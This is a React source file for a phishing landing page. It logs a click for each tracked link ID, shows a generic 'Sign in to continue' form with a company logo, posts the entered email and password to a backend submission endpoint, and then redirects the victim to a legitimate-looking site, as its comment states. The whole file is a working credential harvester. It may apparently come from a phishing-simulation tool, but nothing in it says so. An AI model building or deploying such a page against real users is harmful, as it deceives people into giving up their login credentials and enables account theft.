import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import './styles.css';

const LandingPage = () => {
    const { linkId } = useParams();
    const navigate = useNavigate();
    const [formData, setFormData] = useState({
        email: '',
        password: ''
    });

    useEffect(() => {
        const recordClick = async () => {
            try {
                const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/l/${linkId}`);
                if (!response.ok) {
                    navigate('/error');
                }
            } catch (error) {
                console.error('Error recording click:', error);
                navigate('/error');
            }
        };

        if (linkId) {
            recordClick();
        }
    }, [linkId, navigate]);

    const handleSubmit = async (e) => {
        e.preventDefault();
        try {
            const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData),
            });

            if (response.ok) {
                // Redirect to a legitimate site or success page
                window.location.href = 'https://legitimate-site.com';
            }
        } catch (error) {
            console.error('Error submitting form:', error);
        }
    };

    const handleChange = (e) => {
        setFormData({
            ...formData,
            [e.target.name]: e.target.value
        });
    };

    return (
        <div className="landing-container">
            <div className="login-box">
                <div className="logo">
                    <img src="/logo.png" alt="Company Logo" />
                </div>
                <h2>Sign in to continue</h2>
                <form onSubmit={handleSubmit}>
                    <div className="form-group">
                        <label htmlFor="email">Email</label>
                        <input
                            type="email"
                            id="email"
                            name="email"
                            value={formData.email}
                            onChange={handleChange}
                            required
                        />
                    </div>
                    <div className="form-group">
                        <label htmlFor="password">Password</label>
                        <input
                            type="password"
                            id="password"
                            name="password"
                            value={formData.password}
                            onChange={handleChange}
                            required
                        />
                    </div>
                    <button type="submit">Sign In</button>
                </form>
            </div>
        </div>
    );
};

export default LandingPage;
